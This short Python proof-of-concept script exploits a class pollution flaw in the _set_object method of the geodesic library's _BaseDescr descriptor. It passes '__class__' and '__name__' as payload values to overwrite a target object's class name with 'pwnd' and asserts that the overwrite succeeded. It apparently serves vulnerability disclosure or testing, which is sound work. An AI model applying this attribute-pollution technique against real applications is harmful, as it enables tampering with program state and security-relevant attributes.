# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: _BaseDescr._set_object
# Type: get-attr-set-attr

from geodesic.descriptors import _BaseDescr

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD_NESTED = "__class__"
PAYLOAD_DICT_NAME = "__name__"

def run_poc():
  desc = _BaseDescr(nested=PAYLOAD_NESTED, dict_name=PAYLOAD_DICT_NAME)
  desc.__set_name__(owner=None, name=PAYLOAD_DICT_NAME)
  desc._set_object(target, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
